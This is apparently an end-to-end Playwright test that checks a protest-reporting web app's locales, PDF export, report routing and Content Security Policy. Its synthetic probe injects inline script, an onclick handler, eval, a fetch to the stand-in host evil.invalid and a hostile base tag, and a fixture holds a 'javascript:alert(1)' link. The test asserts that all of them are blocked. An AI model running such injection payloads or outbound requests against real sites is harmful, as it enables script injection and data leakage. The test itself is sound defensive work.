// Run only against locally built static files, with every browser request intercepted.
import {readFileSync,existsSync,writeFileSync} from 'node:fs';
import {resolve,extname} from 'node:path';
import assert from 'node:assert/strict';
import {pathToFileURL} from 'node:url';
import {FIXTURES} from '../../tests/helpers/informe-fixtures.mjs';
const {chromium}=await import(process.env.S16_PLAYWRIGHT_MODULE||'playwright');
const root=resolve('apps/web/dist'),checks=[],requests=[],errors=[],unexpected=[];
const SECOND_ID='22222222-2222-4222-8222-222222222222';
const browser=await chromium.launch({headless:true,...(process.env.S16_CHROMIUM_EXECUTABLE?{executablePath:process.env.S16_CHROMIUM_EXECUTABLE}:{})});
try{
 for(const locale of ['es','en','fr','zh']){
  const context=await browser.newContext({serviceWorkers:'block',viewport:{width:390,height:844},isMobile:true,hasTouch:true});
  await context.addInitScript(locale=>{localStorage.setItem('vc_lang',locale);localStorage.setItem('vc_map_intro','1');window.__policyViolations=[];document.addEventListener('securitypolicyviolation',e=>window.__policyViolations.push({directive:e.effectiveDirective,blocked:e.blockedURI}));},locale);
  await context.route('**/*',async route=>{
   const u=new URL(route.request().url());requests.push({host:u.host,path:u.pathname,method:route.request().method()});
   if(u.origin==='https://voiceprotest.org'&&u.pathname==='/s16-csp-probe.js')return route.fulfill({contentType:'application/javascript',body:`(async()=>{const s=document.createElement('script');s.textContent='window.__inlineAttack=1';document.head.append(s);const b=document.createElement('button');b.setAttribute('onclick','window.__attributeAttack=1');document.body.append(b);b.click();try{eval('window.__evalAttack=1');}catch{}try{await fetch('https://evil.invalid/proof?synthetic=1');}catch{}const base=document.createElement('base');base.href='https://evil.invalid/';document.head.append(base);window.__probeDone=true;})();`});
   if(u.origin==='https://voiceprotest.org'){
    const file=resolve(root,u.pathname==='/'?'index.html':'.'+u.pathname);
    if(!file.startsWith(root+'/')||!existsSync(file))return route.fulfill({status:404,body:'missing'});
    return route.fulfill({path:file,contentType:({'.html':'text/html','.js':'application/javascript','.css':'text/css','.json':'application/json','.ttf':'font/ttf','.png':'image/png','.svg':'image/svg+xml'})[extname(file)]||'application/octet-stream'});
   }
   if(['api.voiceprotest.org','reports.voiceprotest.org','vozciudadanaapi-production.up.railway.app'].includes(u.hostname)){
    assert.equal(route.request().method(),'GET','No provider/business mutation is allowed in this rehearsal');
    if(u.pathname.endsWith('/integrity-data'))return route.fulfill({status:503,contentType:'application/json',headers:{'Access-Control-Allow-Origin':'*'},body:'{"error":"synthetic-unavailable"}'});
    const second=u.pathname.includes(SECOND_ID);
    const data=u.pathname.endsWith('/informe')?(second?{...FIXTURES[locale].data,total_adhesiones:27,protest:{...FIXTURES[locale].data.protest,id:SECOND_ID,title:'S16 second report',hash_integridad:null,fuente_url:'javascript:alert(1)'}}:FIXTURES[locale].data):u.pathname==='/api/ipinfo'?{country_code:'ES',country_name:'Spain',city:'Synthetic'}:[];
    return route.fulfill({status:200,contentType:'application/json',headers:{'Access-Control-Allow-Origin':'*'},body:JSON.stringify(data)});
   }
   if(u.hostname==='cdn.jsdelivr.net')return route.fulfill({status:200,contentType:'application/json',headers:{'Access-Control-Allow-Origin':'*'},body:JSON.stringify({type:'Topology',objects:{countries:{type:'GeometryCollection',geometries:[]}},arcs:[]})});
   if(['www.wikidata.org','query.wikidata.org'].includes(u.hostname))return route.fulfill({contentType:'application/json',headers:{'Access-Control-Allow-Origin':'*'},body:'{"search":[]}'});
   if(u.hostname==='fonts.googleapis.com')return route.fulfill({contentType:'text/css',body:''});
   if(u.hostname==='www.google.com'&&u.pathname.startsWith('/recaptcha/'))return route.fulfill({contentType:'application/javascript',body:'window.__recaptchaMockLoaded=true; window.grecaptcha={ready:fn=>fn(),execute:async()=>"synthetic-no-provider"};'});
   if(u.hostname==='evil.invalid')return route.abort();
   unexpected.push({host:u.host,path:u.pathname});return route.abort();
  });
  const page=await context.newPage();page.on('pageerror',e=>errors.push({locale,message:e.message}));
  await page.goto('https://voiceprotest.org/');await page.locator('#app-shell').waitFor();await page.waitForTimeout(300);
  assert.deepEqual(errors,[],JSON.stringify(errors));
  const text=await page.locator('#app-shell').textContent();const messages=JSON.parse(readFileSync(resolve('apps/web/src/locales',locale+'.json'),'utf8'));assert.ok(text.includes(messages.nav.map),JSON.stringify({locale,text:text.slice(0,1000),errors,violations:await page.evaluate(()=>window.__policyViolations)}));
  assert.equal(await page.evaluate(()=>window.__recaptchaMockLoaded),true);
  const violations=await page.evaluate(()=>window.__policyViolations);assert.deepEqual(violations,[],JSON.stringify(violations));
  checks.push({id:'bootstrap_'+locale,ok:true});
  await page.goto('https://voiceprotest.org/#/informe/'+FIXTURES[locale].data.protest.id);
  await page.locator('.ir-btn-pdf').waitFor();
  const download=page.waitForEvent('download',{timeout:10000});await page.locator('.ir-btn-pdf').click();
  assert.ok((await download).suggestedFilename().endsWith('.pdf'));
  assert.deepEqual(await page.evaluate(()=>window.__policyViolations),[]);
  checks.push({id:'pdf_'+locale,ok:true});
  // Change only the hash: Vue must replace the report instance, including old data and verification state.
  await page.evaluate(id=>{window.location.hash='/informe/'+id;},SECOND_ID);
  await page.waitForFunction(()=>document.querySelector('.ir-doc')?.textContent.includes('S16 second report'));
  assert.ok((await page.locator('.ir-doc').textContent()).includes(SECOND_ID));
  assert.ok(!(await page.locator('.ir-doc').textContent()).includes(FIXTURES[locale].data.protest.title));
  assert.equal(await page.locator('a[href^="javascript:"]').count(),0);
  const secondDownload=page.waitForEvent('download',{timeout:10000});await page.locator('.ir-btn-pdf').click();
  assert.ok((await secondDownload).suggestedFilename().includes('s16-second-report'));
  await page.evaluate(id=>{window.location.hash='/informe/'+id;},FIXTURES[locale].data.protest.id);
  await page.waitForFunction(title=>document.querySelector('.ir-doc')?.textContent.includes(title),FIXTURES[locale].data.protest.title);
  checks.push({id:'report_route_replacement_'+locale,ok:true});
  if(locale==='es'){
   const before=requests.length;const safeBase=await page.evaluate(()=>document.baseURI);
   await page.evaluate(()=>{const script=document.createElement('script');script.src='https://voiceprotest.org/s16-csp-probe.js';document.head.append(script);});await page.waitForFunction(()=>window.__probeDone===true);
   assert.deepEqual(await page.evaluate(()=>[window.__inlineAttack,window.__attributeAttack,window.__evalAttack].map(v=>v??null)),[null,null,null]);
   assert.equal(await page.evaluate(()=>document.baseURI),safeBase);
   assert.ok(!requests.slice(before).some(r=>r.host==='evil.invalid'));
   checks.push({id:'inline_attribute_eval_connect_base_blocked',ok:true});
   const allowed=await page.evaluate(async()=>{const r=await fetch('https://www.wikidata.org/w/api.php');return r.ok;});assert.equal(allowed,true);
  }
  const staticPath=locale==='es'?'/quienes-somos.html':'/'+locale+'/quienes-somos.html';await page.goto('https://voiceprotest.org'+staticPath);assert.ok((await page.locator('body').innerText()).length>80);assert.deepEqual(await page.evaluate(()=>window.__policyViolations),[]);checks.push({id:'static_policy_'+locale,ok:true});
  const invalidStart=requests.length;await page.goto('https://voiceprotest.org/#/informe/'+encodeURIComponent('../bad'));await page.waitForURL('**/#/');assert.ok(!requests.slice(invalidStart).some(r=>r.path.endsWith('/informe')||r.path.endsWith('/integrity-data')));checks.push({id:'invalid_route_'+locale,ok:true});
  await context.close();
 }
 assert.deepEqual(errors,[],JSON.stringify(errors));assert.deepEqual(unexpected,[],JSON.stringify(unexpected));const attemptedMutations=requests.filter(r=>!['GET','HEAD','OPTIONS'].includes(r.method));assert.deepEqual(attemptedMutations,[]);
 const report={status:'PASS',checks,browser:browser.version(),intercepted_requests:requests.length,unexpected_requests:unexpected.length,provider_or_user_mutations_attempted:attemptedMutations.length,network_mode:'Every application HTTP request is fulfilled/aborted; no pass-through path. Browser/tool downloads are outside this measurement.',limits:'Chromium CSP/bootstrap with intercepted synthetic services. Service worker covered separately; no real CAPTCHA/OTP delivery or all-device certification.'};
 if(process.env.S16_REPORT)writeFileSync(process.env.S16_REPORT,JSON.stringify(report,null,2)+'\n');console.log(JSON.stringify(report));
}finally{await browser.close();}
